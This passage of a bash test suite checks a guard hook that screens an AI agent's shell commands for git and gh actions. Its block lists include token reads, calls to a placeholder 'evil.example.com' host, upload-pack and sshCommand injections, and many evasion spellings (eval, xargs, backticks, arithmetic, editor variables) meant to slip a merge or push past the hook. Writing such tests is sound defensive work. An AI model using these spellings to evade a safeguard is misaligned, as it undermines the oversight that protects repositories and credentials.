    block "gh api graphql -f query='mutation { mergePullRequest(input:{pullRequestId:\"x\"}) { clientMutationId } }'" 'mergepullrequest'
    block "gh api graphql -f query='mutation(\$id:ID!){ enablePullRequestAutoMerge(input:{pullRequestId:\$id}){ clientMutationId } }' -f id=x"
    block "gh api graphql -F query='mutation { m: enqueuePullRequest(input:{pullRequestId:\"x\"}) { clientMutationId } }'"
    block 'gh api graphql -f query="$QUERY"' 'shell expansion'
    block 'gh api graphql -F query=@merge.graphql' 'file'
    block 'gh api graphql --input body.json' '--input'
    block 'gh api graphql -f "$FIELD"'
    block "gh pr comment 5 --body '@dependabot merge'" 'bot command'
    block 'gh pr comment 5 --body "@dependabot squash and merge"' 'bot command'
    block "gh issue comment 5 -b 'bors r+'" 'bot command'
}

# ---- the rest of gh --------------------------------------------------------------------

case_ordinary_gh_is_allowed() {
    allow 'gh pr view 5'
    allow 'gh pr list --json number,title | jq .'
    allow 'gh pr create --head feat --title "feat: x" --body "body"'
    allow 'gh pr create --draft -H feat --title "$TITLE" --body "$(cat <<'"'"'EOF'"'"'
## Summary

Text with `code` and $(not run).
EOF
)"'
    allow 'gh pr create --head=feat --fill'
    allow 'gh pr comment 5 --body "looks good to merge once CI is green"'
    allow 'gh pr ready 5'
    allow 'gh pr close 5 --delete-branch'
    allow 'gh pr edit 5 --title x --base main'
    allow 'gh pr review 5 --approve'
    allow 'gh pr checks 5 --watch'
    allow 'gh pr checkout 5'
    allow 'gh co 5'
    allow 'gh pr diff "$PR"'
    allow 'gh auth status'
    allow 'gh auth status --hostname github.com'
    allow 'gh repo view --json defaultBranchRef'
    allow 'gh repo edit --description "new text"'
    allow 'gh repo edit --add-topic rust --enable-wiki=false'
    allow 'gh repo clone acme/widgets'
    allow 'gh repo clone acme/widgets dir -- --depth=1'
    allow 'gh repo fork acme/widgets --clone'
    allow 'gh repo create acme/new --private'
    allow 'gh repo sync'
    allow 'gh repo sync acme/fork --branch feat'
    allow 'gh repo set-default --view'
    allow 'gh run list --limit 5'
    allow 'gh run watch 123'
    allow 'gh workflow run ci.yaml --ref feat'
    allow 'gh release create v1.0.0 --notes "x"'
    allow 'gh secret set FOO --body bar'
    allow 'gh issue create --title x --body y'
    allow 'gh ssh-key list'
    allow 'gh gpg-key list'
    allow 'gh alias list'
    allow 'gh extension list'
    allow 'gh config get git_protocol'
    allow 'gh ruleset list'
    allow 'gh --version'
    allow 'gh'
    allow 'GH_PAGER=cat gh pr view 5'
    allow 'NO_COLOR=1 GH_REPO=acme/widgets gh pr list'
    allow 'gh api repos/acme/widgets/pulls'
    allow 'gh api repos/acme/widgets/branches/main/protection'
    allow 'gh api "repos/$OWNER/$REPO/pulls/$N/comments" --paginate --jq ".[].body"'
    allow 'gh api "$ENDPOINT"'
    allow 'gh api --method POST repos/acme/widgets/pulls/5/comments/9/replies -f body=done'
    allow 'gh api --method POST repos/acme/widgets/issues/5/comments -f body="$BODY"'
    allow 'gh api "repos/$O/$R/issues/$N/labels" -f "labels[]=bug"'
    allow 'gh api -X PATCH repos/acme/widgets/pulls/5 -f title=x'
    allow 'gh api -X DELETE repos/acme/widgets/issues/comments/9'
    allow 'gh api -X POST repos/acme/widgets/pulls/5/update-branch'
    allow 'gh api -X POST repos/acme/widgets/pulls --input body.json'
    allow "gh api graphql -f query='query { viewer { login } }'"
    allow "gh api graphql -f query='query(\$o:String!){ repository(owner:\$o,name:\"x\"){ id } }' -f o=acme"
    allow "gh api graphql -f query='mutation(\$id:ID!){ resolveReviewThread(input:{threadId:\$id}){ thread { id } } }' -f id=x"
    allow "gh api graphql -f query='mutation(\$id:ID!){ disablePullRequestAutoMerge(input:{pullRequestId:\$id}){ clientMutationId } }' -f id=x"
}

case_gh_permission_overrides_are_denied() {
    block 'gh pr create --title x --body y' '--head'
    block 'gh pr create --fill' '--head'
    block 'gh auth token' 'credential'
    block 'gh auth login'
    block 'gh auth logout'
    block 'gh auth refresh -s admin:org'
    block 'gh auth switch'
    block 'gh auth setup-git'
    block 'gh auth git-credential get'
    block 'gh auth status --show-token' 'token'
    block 'gh auth status -t' 'token'
    block 'gh auth $SUB'
    block 'gh ssh-key add key.pub'
    block 'gh gpg-key delete ABC'
    block 'gh repo deploy-key add key.pub'
    block 'gh repo deploy-key delete 1'
    block "gh alias set m 'pr merge'"
    block 'gh alias import aliases.yml'
    block 'gh extension install owner/gh-x'
    block 'gh extension exec x'
    block 'gh config set git_protocol https'
    block 'gh repo edit --default-branch other' 'default branch'
    block 'gh repo edit --visibility public --accept-visibility-change-consequences'
    block 'gh repo edit --enable-secret-scanning-push-protection=false'
    block 'gh repo edit $FLAGS'
    block 'gh repo edit "$FLAG"'
    block 'gh repo set-default acme/widgets'
    block 'gh repo fork --remote'
    block 'gh repo fork acme/widgets --remote-name upstream'
    block 'gh repo create acme/new --source . --push' '--push'
    block 'gh repo create acme/new $EXTRA'
    block 'gh repo sync acme/fork' 'default branch'
    block 'gh repo sync acme/fork --branch develop' 'default branch'
    block 'gh repo sync acme/fork -b main' 'default branch'
    block 'gh repo sync acme/fork -b "$B"'
    block 'gh repo clone acme/widgets -- --upload-pack=evil' 'git clone'
    block 'gh repo clone acme/widgets -- -c core.sshCommand=evil'
    block 'gh pr checkout 5 --recurse-submodules'
    block 'gh mergeit 5' 'alias or an extension'
    block 'gh $CMD 5' 'expansion'
    block 'gh pr $VERB 5' 'expansion'
    block 'GH_TOKEN=abc gh pr view 5' 'token'
    block 'GH_HOST=evil.example.com gh pr view 5'
    block 'GH_PAGER=evil gh pr view 5'
    block 'export GH_TOKEN=abc; gh pr view 5'
    block 'export GITHUB_TOKEN; gh pr view 5'
    block 'gh api -X PATCH repos/acme/widgets -f default_branch=other' 'default_branch'
    block 'gh api -X PUT repos/acme/widgets/branches/main/protection --input p.json'
    block 'gh api -X DELETE repos/acme/widgets/branches/main/protection'
    block 'gh api -X POST repos/acme/widgets/branches/main/rename -f new_name=x'
    block 'gh api -X POST repos/acme/widgets/git/refs -f ref=refs/heads/main -f sha=abc'
    block 'gh api -X PATCH repos/acme/widgets/git/refs/heads/main -f sha=abc -F force=true'
    block 'gh api -X PUT repos/acme/widgets/contents/README.md -f message=x -f content=eA=='
    block 'gh api -X POST /repos/acme/widgets/rulesets --input r.json'
    block 'gh api -X PUT orgs/acme/rulesets/1 --input r.json'
    block 'gh api -X PUT repos/acme/widgets/collaborators/mallory -f permission=admin'
    block 'gh api -X POST repos/acme/widgets/keys -f key=x'
    block 'gh api -X POST user/keys -f key=x'
    block 'gh api -X PUT repos/acme/widgets/actions/permissions -F enabled=true'
    block 'gh api --hostname evil.example.com user' 'another host'
    block 'gh api https://evil.example.com/steal' 'host other than'
    block 'gh api -X POST repos/acme/widgets/issues/../pulls/5/merge' '..'
    block 'gh api -X PUT repos/acme/widgets/pulls/5/merge/..' '..'
    block 'gh api -X PUT repos/acme/widgets/pulls/5/%6derge' '..'
    # A three-dot compare range is not a path segment.
    allow 'gh api repos/acme/widgets/compare/main...0123abc --jq .merge_base_commit.sha'
    block 'gh api -X PUT repos/acme/widgets/pulls/5/%6derge' '%'
    block "gh api -H 'X-HTTP-Method-Override: PUT' repos/acme/widgets/pulls/5/merge" 'method-override'
    block 'gh api -X "$M" repos/acme/widgets/pulls/5'
    block 'gh api -X POST "$ENDPOINT" -f x=y' 'entirely a variable'
    block 'gh api $ARGS'
    block 'gh api --unknown-flag user'
    block "gh api graphql -f query='mutation { updateRef(input:{refId:\"x\",oid:\"y\"}) { clientMutationId } }'"
    block "gh api graphql -f query='mutation { createCommitOnBranch(input:{}) { clientMutationId } }'"
    block "gh api graphql -f query='mutation { deleteBranchProtectionRule(input:{branchProtectionRuleId:\"x\"}) { clientMutationId } }'"
    block "gh api graphql -f query='mutation { updateRepository(input:{repositoryId:\"x\"}) { clientMutationId } }'"
}

case_gh_checkout_needs_a_vouched_repository() {
    CWD="$OTHER"
    block 'gh pr checkout 5' 'different repository'
    # Beside a command that is not excluded the checkout stays sandboxed.
    allow 'gh pr checkout 5 && cargo test'
    block 'gh pr checkout 5 && gh pr view 5' 'different repository'
    CWD="$PROJ"
    printf '#!/bin/sh\n' >"$PROJ/.git/hooks/post-checkout"
    block 'gh pr checkout 5' 'post-checkout'
    block 'gh repo sync' 'post-checkout'
    rm -f "$PROJ/.git/hooks/post-checkout"
}

# ---- indirection the hook can see ---------------------------------------------------------

case_visible_indirection_is_denied() {
    block "bash -c 'gh pr merge 5'" 'directly'
    block 'sh -c "git push origin main"' 'directly'
    block 'eval "gh pr merge 5"' 'directly'
    block "alias m='gh pr merge'; m 5" 'directly'
    block 'M="gh pr merge"; $M 5' 'by name'
    block 'G=git; $G push origin main' 'by name'
    block 'export TOOL=/usr/bin/gh; "$TOOL" pr merge 5' 'by name'
    block "find . -name '*.md' -exec git rm {} +" 'directly'
    allow 'bash tests/git-gh-guard-hook.test.sh'
    allow '$RUNNER build'
    allow 'for f in a b; do echo "$f"; done; git status'
}

# ---- what the hook cannot read ---------------------------------------------------------------

case_unreadable_commands_fail_closed() {
    block 'git status "unclosed' 'could not close'
    block 'gh pr view $(echo 5' 'could not close'
    block 'git log ${X:-$(gh pr merge 5)}' 'expansion'
    local input rc
    input=$(jq -nc --arg c $'git status \x1e' --arg d "$PROJ" \
        '{hook_event_name:"PreToolUse",tool_name:"Bash",tool_input:{command:$c},cwd:$d}')
    PATH="$STUB:$PATH" "$BASH_BIN" "$HOOK" >/dev/null 2>&1 <<<"$input"
    rc=$?
    if [ "$rc" = 2 ]; then
        pass "deny: a command carrying a framing byte"
    else
        fail "a framing byte got rc ${rc}, want 2"
    fi

    # No jq on PATH: a command naming git or gh is refused, anything else passes.
    local nojq="$WORK/nojq"
    mkdir -p "$nojq"
    ln -sf "$(command -v cat)" "$nojq/cat"
    input=$(jq -nc --arg d "$PROJ" \
        '{hook_event_name:"PreToolUse",tool_name:"Bash",tool_input:{command:"gh pr view 5"},cwd:$d}')
    PATH="$nojq" "$BASH_BIN" "$HOOK" >/dev/null 2>&1 <<<"$input"
    rc=$?
    if [ "$rc" = 2 ]; then
        pass "deny: gh with no jq on PATH"
    else
        fail "gh with no jq got rc ${rc}, want 2"
    fi
    input=$(jq -nc --arg d "$PROJ" \
        '{hook_event_name:"PreToolUse",tool_name:"Bash",tool_input:{command:"ls -la"},cwd:$d}')
    PATH="$nojq" "$BASH_BIN" "$HOOK" >/dev/null 2>&1 <<<"$input"
    rc=$?
    if [ "$rc" = 0 ]; then
        pass "allow: an unrelated command with no jq on PATH"
    else
        fail "ls with no jq got rc ${rc}, want 0"
    fi

    PATH="$STUB:$PATH" "$BASH_BIN" "$HOOK" >/dev/null 2>&1 <<<'not json, but it says git push'
    rc=$?
    if [ "$rc" = 2 ]; then
        pass "deny: unreadable hook input that names git"
    else
        fail "unreadable input naming git got rc ${rc}, want 2"
    fi
}

# ---- spellings a first reading misses ---------------------------------------------------

case_push_through_a_symbolic_name_is_denied() {
    local repo="$WORK/sym"
    make_repo "$repo" git@github.com:acme/widgets.git
    git -C "$repo" symbolic-ref HEAD refs/heads/main
    git -C "$repo" -c user.name=t -c user.email=t@example.invalid commit -q --allow-empty -m init ||
        fatal "fixture commit failed"
    git -C "$repo" branch feat
    git -C "$repo" symbolic-ref refs/heads/alias refs/heads/main
    git -C "$repo" worktree add -q "$WORK/sym-wt" -b side >/dev/null 2>&1 || fatal "fixture worktree failed"
    PROJECT="$repo"
    CWD="$repo"
    allow 'git push origin feat'
    allow 'git push origin refs/heads/feat'
    allow 'git push origin alias:feat'
    block 'git push origin alias' 'plain name'
    block 'git push origin worktrees/sym-wt/HEAD' 'plain name'
    block 'git push origin head'
    block 'git push origin Head'
    block 'git push origin feat:head' 'destination branch literally'
    printf '[push]\n\tdefault = upstream\n' >"$WORK/global-config"
    GIT_CONFIG_GLOBAL="$WORK/global-config"
    block 'git push origin feat' 'push.default'
    allow 'git push origin feat:feat'
    GIT_CONFIG_GLOBAL=/dev/null
    PROJECT="$PROJ"
    CWD="$PROJ"
    git -C "$PROJ" config gc.recentObjectsHook /tmp/x
    block 'git push origin feat' 'gc.recentobjectshook'
    git -C "$PROJ" config --unset gc.recentObjectsHook
    git -C "$PROJ" config gc.auto 0
    allow 'git push origin feat'
    git -C "$PROJ" config --unset gc.auto
}

case_merge_spellings_are_denied() {
    block 'gh pr -R acme/widgets merge 5 --squash' 'where the subcommand goes'
    block 'gh pr --repo acme/widgets merge 5 --squash' 'where the subcommand goes'
    block 'gh pr -R acme/widgets create --title x' 'where the subcommand goes'
    block 'gh pr -R acme/widgets checkout 5' 'where the subcommand goes'
    block 'gh -R acme/widgets pr merge 5' 'before the command'
    block 'gh pr {merge,5} --squash' 'brace list'
    block 'gh pr m* 5' 'glob'
    allow 'gh pr --help'
    block 'gh pr -h' 'where the subcommand goes'
    block 'gh auth -h github.com token' 'where the subcommand goes'
    block 'gh api -X PUT repos/acme/widgets/./pulls/5/merge' 'path segment'
    block "X='a:b -X PUT'; gh api repos/acme/widgets/pulls/5/merge -H \$X" 'unquoted expansion'
    block 'gh api repos/acme/widgets/pulls/5/merge -H ${=X}' 'unquoted expansion'
    block 'gh api repos/acme/widgets/pulls/5/merge --jq $X' 'unquoted expansion'
    block 'gh api repos/acme/widgets/pulls/5 -f $X' 'unquoted expansion'
    allow 'gh api repos/acme/widgets/issues/5/comments -f body=$BODY'
    allow 'gh api repos/acme/widgets/pulls/5 --jq "$FILTER"'
    allow 'gh browse --help'
    allow 'gh status --org acme'
    block "gh api -X PUT 'repos/acme/widgets/pulls/5/merge#x'" 'merges a pull request'
    block 'gh api -X PUT repos/acme/widgets/pulls/5/merge/' 'merges a pull request'
    block 'gh api -X PUT repos/acme/widgets//pulls/5/merge' 'merges a pull request'
    block 'gh api -X PUT repositories/123456/pulls/5/merge' 'merges a pull request'
    block 'gh api -X PUT repositories/1/branches/main/protection --input p.json'
    block 'gh api -X PUT organizations/1/rulesets/2 --input r.json'
    block 'gh api -t --help -X PUT repos/acme/widgets/pulls/5/merge' 'merges a pull request'
    block 'gh api --help -X PUT repos/acme/widgets/pulls/5/merge'
    allow 'gh api --help'
    block "gh api 'graphql#x' -f query='mutation{mergePullRequest(input:{pullRequestId:\"x\"}){clientMutationId}}'" 'mergepullrequest'
    block "gh api graphql/ -f query='mutation{mergePullRequest(input:{pullRequestId:\"x\"}){clientMutationId}}'" 'mergepullrequest'
    block "gh api \"graph\$Q\" -f query='mutation{mergePullRequest(input:{pullRequestId:\"x\"}){clientMutationId}}'" 'mergepullrequest'
    block 'gh api "graph$Q" -f query="$DOC"' 'shell expansion'
    block 'gh api "graph$Q" --input doc.json' '--input'
    block "gh api -X POST repos/acme/widgets/issues -f query='mutation{mergePullRequest(input:{}){clientMutationId}}'" 'mergepullrequest'
    block 'v=merge; gh api -X PUT "repos/acme/widgets/pulls/5/$v"' 'could spell'
    block 'gh api -X PUT "repos/$R/pulls/$N/$V"' 'could spell'
    block 'gh api -X PUT "repos/acme/widgets/pulls/$N"' 'could spell'
    block 'gh api -X PUT "repos/$OWNER/widgets/pulls/5/merge"' 'could spell'
    block 'gh api -X POST "repos/$R/$PATH_TAIL" -f x=y' 'could spell'
    block 'gh api -X PUT repos/acme/widgets/pulls/{5,6}/merge'
    block 'gh api -X POST repos/acme/widgets/issue[s]/5/comments -f body=x' 'glob'
    allow 'gh api -X PATCH "repos/$R/pulls/$N" -F title=@/tmp/t'
    allow 'gh api -X POST "repos/$R/issues/$N/comments" -F body=@/tmp/b'
    allow 'gh api -X POST "repos/$O/$R/pulls/$N/comments/$C/replies" -F body=@/tmp/b'
    allow 'gh api -X PUT "repos/$R/pulls/$N/update-branch"'
    allow 'gh api "repos/$R/pulls/$N/merge"'
    allow 'gh api "$URL"'
    block "gh api -X POST repos/acme/widgets/issues/5/comments -f body='@dependabot merge'" 'bot command'
    block "gh api repos/acme/widgets/issues/5/comments -f body='bors r+'" 'bot command'
}

case_unread_text_fails_closed() {
    block $'echo $((1<<2))\ngh pr merge 5 --squash' 'merging a pull request'
    block $'echo $((1 << 2)); gh pr merge 5 --squash' 'merging a pull request'
    block $'((n = 1 << 2))\ngh pr merge 5 --squash' 'merging a pull request'
    allow 'echo $((1<<2)); git status'
    allow 'n=$((n + 1)); git status'
    allow 'for ((i = 0; i < 3; i++)); do git status; done'
    block 'echo ${x:-"}"}; gh pr merge 5 --squash #"' 'expansion'
    block 'git --shallow-file /dev/null push origin main' 'not a git option'
    block 'git --frobnicate status' 'not a git option'
    allow 'git --version'
    allow 'git --exec-path'
    block $'cat <<EOF\nno end\ngh pr merge 5' 'heredoc'
}

case_indirection_inside_one_call_is_denied() {
    block "echo 'gh pr merge 5 --squash' | bash" 'standard input'
    block "echo 'gh pr merge 5 --squash' | sh -s" 'standard input'
    block "bash <<'SH'
gh pr merge 5 --squash
SH" 'standard input'
    block "bash <<<'gh pr merge 5 --squash'"
    block "cmd='gh pr merge 5 --squash'; eval \"\$cmd\"" 'by name'
    block "cmd='gh pr merge 5 --squash'; bash -c \"\$cmd\"" 'by name'
    block '$(which gh) pr merge 5 --squash' 'by name'
    block '"$(command -v gh)" pr merge 5 --squash' 'by name'
    block 'function f { gh pr merge 5 --squash; }; f' 'merging a pull request'
    block 'f() { gh pr merge 5 --squash; }; f' 'merging a pull request'
    block 'for g in gh; do $g pr merge 5 --squash; done' 'by name'
    block 'env -u GH_DEBUG gh pr merge 5 --squash' 'merging a pull request'
    block 'env GH_DEBUG=1 gh pr merge 5 --squash'
    block 'timeout -s INT 60 gh pr merge 5 --squash' 'merging a pull request'
    block 'nice -n 5 gh pr merge 5 --squash' 'merging a pull request'
    block 'echo 5 | xargs -I {} gh pr merge {} --squash' 'merging a pull request'
    block "echo 'merge 5 --squash' | xargs gh pr" 'expansion'
    block "echo 'pr merge 5 --squash' | xargs gh" 'expansion'
    block "echo 'origin main' | xargs git push"
    block "echo '-X PUT repos/acme/widgets/pulls/5/merge' | xargs gh api"
    block 'op run -- gh pr merge 5 --squash' 'merging a pull request'
    block 'doppler run -- gh pr merge 5 --squash' 'merging a pull request'
    block 'repeat 1 gh pr merge 5 --squash' 'merging a pull request'
    block "git rebase main --exec 'gh pr merge 5 --squash'" '--exec'
    block "git rebase main -x 'git push origin main'" '--exec'
    block "git rebase main --exec='gh pr merge 5'" '--exec'
    block 'git bisect run gh pr merge 5 --squash' 'handed a git or gh command'
    block "git submodule foreach 'gh pr merge 5 --squash'" 'handed a git or gh command'
    block "trap 'gh pr merge 5 --squash' EXIT" 'directly'
    block 'git subtree push --prefix=src origin main' 'subtree push'
    block 'gh repo create acme/new --source . --push=true' '--push'
    block 'git am -n 0001.patch' 'hooks'
    block 'git am -3n 0001.patch' 'hooks'
    allow 'git am -3 0001.patch'
    allow 'git rebase main'
    allow "git rebase -i main --exec 'cargo test'"
    allow 'git bisect start'
    allow 'git bisect run cargo test'
    allow 'git submodule update --init'
    allow 'git subtree split --prefix=src -b split'
    allow 'git ls-files -z | xargs -0 git add'
    allow 'echo 5 | xargs gh pr view'
    allow 'env GH_PROMPT_DISABLED=1 gh pr view 5'
    allow 'bash scripts/build.sh && git status'
    allow "bash -c 'echo built' && git status"
    allow 'gh repo create acme/new --source . --push=false'
}

case_plain_requests_are_not_denied() {
    allow 'export GH_PAGER=cat; gh pr diff 5'
    allow 'export GIT_PAGER=cat; git log -1'
    allow 'export GH_PROMPT_DISABLED=1; gh pr view 5'
    block 'export GH_PAGER=less; gh pr diff 5'
    allow 'gh repo edit acme/widgets --delete-branch-on-merge'
    allow 'gh repo edit --enable-auto-merge'
    allow 'gh repo edit --enable-merge-commit=false'
    block 'gh repo edit --allow-forking=true'
    block 'gh repo edit --enable-advanced-security=false'
    allow 'gh api -X PATCH repos/acme/widgets -f description=x'
    allow 'gh api -X PATCH "repos/$R" -f description=x'
    allow 'gh api -X PATCH repos/acme/widgets -F delete_branch_on_merge=true'
    block 'gh api -X PATCH repos/acme/widgets -F private=false' 'private'
    block 'gh api -X PATCH repos/acme/widgets -f "security_and_analysis[secret_scanning][status]=disabled"'
    block 'gh api -X PATCH repos/acme/widgets --input r.json' '--input'
    block 'gh api -X PATCH repos/acme/widgets -f "$F"' 'variable'
    block 'gh api -X PATCH "repos/$R" -f visibility=public' 'visibility'
    allow 'gh api -X DELETE repos/acme/widgets/git/refs/heads/feat'
    allow 'gh api -X PATCH repos/acme/widgets/git/refs/heads/feat/x -f sha=abc -F force=true'
    allow 'gh api -X POST repos/acme/widgets/git/refs -f ref=refs/heads/x -f sha=abc'
    allow 'gh api -X POST repos/acme/widgets/git/refs -f ref=refs/tags/v1 -f sha=abc'
    allow 'gh api -X DELETE repos/acme/widgets/git/refs/tags/v1'
    block 'gh api -X DELETE repos/acme/widgets/git/refs/heads/trunk' 'default branch'
    block 'gh api -X PATCH repos/acme/widgets/git/refs/heads/Main -f sha=abc' 'default branch'
    block 'gh api -X POST repos/acme/widgets/git/refs -f ref=refs/heads/trunk -f sha=abc' 'default branch'
    block 'gh api -X POST repos/acme/widgets/git/refs -f ref=refs/pull/5/head -f sha=abc' 'outside refs/heads'
    block 'gh api -X POST repos/acme/widgets/git/refs --input ref.json' '--input'
    block 'gh api -X POST repos/acme/widgets/git/refs -f "ref=$REF" -f sha=abc' 'variable'
    block 'gh api -X POST repos/acme/widgets/git/refs -f sha=abc' 'default branch'
    block 'gh api -X DELETE repos/acme/widgets/git/refs/pull/5/head' 'outside refs/heads'
    block 'gh api -X DELETE "repos/$R/git/refs/heads/feat"' 'could spell'
    block 'gh api -X DELETE repos/{owner}/{repo}/git/refs/heads/feat' 'literally'
    block 'gh api -X DELETE repositories/1/git/refs/heads/feat' 'literally'
    allow 'gh api -X PUT repos/acme/widgets/contents/README.md -f message=x -f content=eA== -f branch=feat'
    block 'gh api -X PUT repos/acme/widgets/contents/README.md -f message=x -f content=eA== -f branch=trunk' 'default branch'
    block 'gh api -X PUT repos/acme/widgets/contents/README.md -f message=x -f content=eA== -F branch=@b.txt'
    allow 'gh api repos/acme/widgets/merges -f base=feat -f head=other'
    allow 'gh api -X POST repos/acme/widgets/merge-upstream -f branch=feat'
    allow 'gh api -X POST repos/acme/widgets/git/commits --input commit.json'
    allow 'gh api repos/acme/widgets/git/refs/heads/main'
}

case_a_scratch_push_to_a_local_remote_is_allowed() {
    local scr="$WORK/scr2"
    git init -q --bare "$WORK/bare.git" || fatal "git init --bare failed"
    make_repo "$scr" "$WORK/bare.git"
    block "cd $scr && git push origin main" 'own Bash call'
    allow "git -C $scr push -u origin main; ls"
    block "git -C $scr push -u origin main && git status" 'own Bash call'
    allow "git -C $scr push -q origin main && echo pushed"
    # Alone, the push may leave the sandbox, where the scratch hooks would run.
    block "git -C $scr push origin main" 'git option before the subcommand'
    CWD="$scr"
    block 'git push origin main' 'different repository'
    block 'true && git push origin main'
    CWD="$PROJ"
    block "cd \"\$DIR\" && git push origin main" 'own Bash call'
    block "cd $scr && git push $WORK/bare.git main" 'own Bash call'
    block "cd $scr && git -c url.git@github.com:acme/widgets.git.insteadOf=$WORK/bare.git push origin main" 'own Bash call'
    block "cd $scr && GIT_SSH_COMMAND=x git push origin main" 'own Bash call'
    block "cd $scr && git push --receive-pack=evil origin main" 'own Bash call'
    block "cd $scr && echo \$(git push origin main)"
    git -C "$scr" remote add hub git@github.com:acme/widgets.git
    block "cd $scr && git push hub main" 'own Bash call'
    git -C "$scr" config url.git@github.com:acme/widgets.git.insteadOf "$WORK/bare.git"
    block "cd $scr && git push origin main" 'own Bash call'
    # Git tries `<path>.git` beside a path that is not a repository.
    mkdir -p "$WORK/d"
    ln -s "$PROJ/.git" "$WORK/d.git"
    git -C "$scr" remote add side "$WORK/d"
    block "git -C $scr push --force side main:side; true" 'own Bash call'
    block "git -C $scr push --delete side side; true"
    rm -rf "$WORK/d" "$WORK/d.git"
    # The project repository is never scratch.
    block "cd $PROJ && git push origin feat" 'own Bash call'
}

case_names_the_volume_folds_are_read() {
    # macOS volumes fold case, so `GH` runs gh.
    block 'GH pr merge 5 --squash' 'merging a pull request'
    block 'Gh pr merge 5 --squash' 'merging a pull request'
    block 'Git push origin main' 'default branch'
    block 'GIT -c core.hooksPath=/dev/null commit -m x' 'core.hooksPath'
    block 'ENV GH pr merge 5' 'merging a pull request'
    allow 'Gh pr view 5'
    allow 'GIT status'
}

case_arithmetic_and_backticks_hide_nothing() {
    block $'echo $(( gh << 2 ))\ngh pr merge 5 --squash\n2' 'arithmetic'
    block $'(( gh << 2 ))\ngh pr merge 5 --squash\n2' 'arithmetic'
    block $'echo $[1<<2]\ngh pr merge 5 --squash\n2]' 'arithmetic'
    block 'echo $(( $(gh pr merge 5 >/dev/null; echo 1) + 1 ))' 'merging a pull request'
    block 'echo $((gh pr merge 5); echo x)' 'merging a pull request'
    block 'x=`echo \\'"'"'`; gh pr merge 5 --squash; : '"'"'`'"'"' #'"'" 'backtick'
    block $'x=`echo # `; gh pr merge 5\n`' 'backtick'
    block 'x=`echo '"'"'`; gh pr merge 5; : `'"'"'`' 'backtick'
    allow 'n=$(( $(git rev-list --count HEAD) + 1 ))'
    allow 'echo $((1 << 2)); git status'
    allow 'x=`git rev-parse HEAD`; echo "$x"'
    allow 'git commit -m "use \`gh pr view\` here"'
}

case_a_built_command_word_is_read_or_refused() {
    block '"$HOMEBREW_PREFIX/bin/gh" pr merge 5 --squash' 'merging a pull request'
    block '$HOME/.nix-profile/bin/gh pr merge 5 --squash' 'merging a pull request'
    block '"$(brew --prefix)/bin/gh" pr merge 5 --squash' 'merging a pull request'
    allow '"$HOMEBREW_PREFIX/bin/gh" pr view 5'
    block '${X:-gh} pr merge 5 --squash' 'default'
    block '"${GH:-gh}" pr merge 5 --squash' 'default'
    block '$commands[gh] pr merge 5 --squash' 'spells git or gh'
    block '{gh,} pr merge 5 --squash' 'spells git or gh'
    block '- gh pr merge 5 --squash' 'merging a pull request'
    block 'arch -arm64 gh pr merge 5 --squash' 'merging a pull request'
    block 'fd -e md -x gh pr merge 5 --squash' 'merging a pull request'
    block 'ssh localhost gh pr merge 5 --squash' 'merging a pull request'
    block "env -S 'gh pr merge 5 --squash'" 'env -S'
    block 'hash -p /opt/homebrew/bin/gh foo; foo pr merge 5' 'second name'
    block 'ln -s /opt/homebrew/bin/gh ./foo; ./foo pr merge 5' 'second name'
    block 'env GH_TOKEN=x gh pr view 5' 'GH_TOKEN'
    block 'op run -- gh pr view 5' 'environment of its own making'
    block 'doppler run -- gh pr view 5' 'environment of its own making'
    allow 'repo=${url%.git}; gh repo view "$repo"'
    allow 'ssh host git status'
    allow 'docker run --rm img git log -1'
    allow 'timeout 60 gh pr checks 5 --watch'
    allow 'env gh pr view 5'
    allow 'echo git push origin main'
    allow "rg 'git push' src"
    allow 'bash tests/git-gh-guard-hook.test.sh'
    allow './scripts/git-*.sh'
    allow 'cp gh.txt ./x'
}

case_a_program_valued_setting_cannot_carry_a_command() {
    block "GIT_EDITOR='gh pr merge 5 --squash #' git commit --amend" 'GIT_EDITOR'
    block "GIT_EXTERNAL_DIFF='gh pr merge 5 --squash #' git diff" 'GIT_EXTERNAL_DIFF'
    block "git -c core.editor='gh pr merge 5 --squash #' commit --amend" 'core.editor'
    block "git -c sequence.editor='gh pr merge 5 --squash #' rebase -i HEAD~1" 'sequence.editor'
    block "git -c difftool.x.cmd='gh pr merge 5 --squash' difftool -y -t x HEAD~1" 'difftool.x.cmd'
    block "export GIT_EDITOR='gh pr merge 5 #'; git commit --amend" 'GIT_EDITOR'
    block "export EDITOR='gh pr merge 5 #'; git commit --amend" 'EDITOR'
    block "git config core.editor 'gh pr merge 5 #'" 'value holds'
    allow 'GIT_EDITOR=true git rebase --continue'
    allow 'git -c core.editor=true rebase --continue'
    allow 'EDITOR=vim git commit'
    allow "msg='run git push later'; git commit -m \"\$msg\""
}

case_every_exported_name_counts() {
    block 'export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null GIT_AUTHOR_NAME=x; git commit -m x' 'GIT_CONFIG'
    block 'set -a; GIT_CONFIG_COUNT=1; GIT_CONFIG_KEY_0=core.hooksPath; GIT_CONFIG_VALUE_0=/dev/null; git commit -m x' 'GIT_CONFIG'
    block 'export GH_TOKEN=x GH_PAGER=cat; gh pr view 5' 'GH_TOKEN'
    allow 'set -euo pipefail; GIT_SHA=$(git rev-parse HEAD); git log -1 "$GIT_SHA"'
    block 'git commit -m x --no-g' 'no-gpg-sign'
    block 'git am --no-v x.patch' 'no-verify'
    block 'git merge --no-verify-signatures feat' 'signature check'
}

case_each_verb_has_its_own_value_flags() {
    # `-s`, `-m`, `-x` and `-u` take no value on these verbs, so the word
    # after them is still a flag.
    block 'git am -s --no-verify p.patch' 'no-verify'
    block 'git am -u --no-verify p.patch' 'no-verify'
    block 'git am -mn p.patch' 'no-verify'
    block 'git rebase -m --no-verify main' 'no-verify'
    block 'git cherry-pick -x --no-gpg-sign abc123' 'no-gpg-sign'
    block 'git cherry-pick -s --no-gpg-sign abc123' 'no-gpg-sign'
    block 'git revert -s --no-gpg-sign HEAD' 'no-gpg-sign'
    block 'git commit --amend --no-post-rewrite -m x' 'no-post-rewrite'
    allow 'git merge -m "--no-verify is a flag" feat'
    allow 'git cherry-pick -m 1 abc123'
    allow 'git rebase --onto main feat~2 feat'
    allow 'git tag -u ABCDEF -m x v1'
    allow 'git am -3 p.patch'
}

case_a_flag_with_an_expansion_in_it_is_read() {
    block "git commit \$'--no-verify' -m x" 'no-verify'
    block 'git commit --no-verify"$e" -m x' 'no-verify'
    block 'git commit --no-"$x" -m x' 'built from an expansion'
    block 'git commit -"$x" -m x' 'built from an expansion'
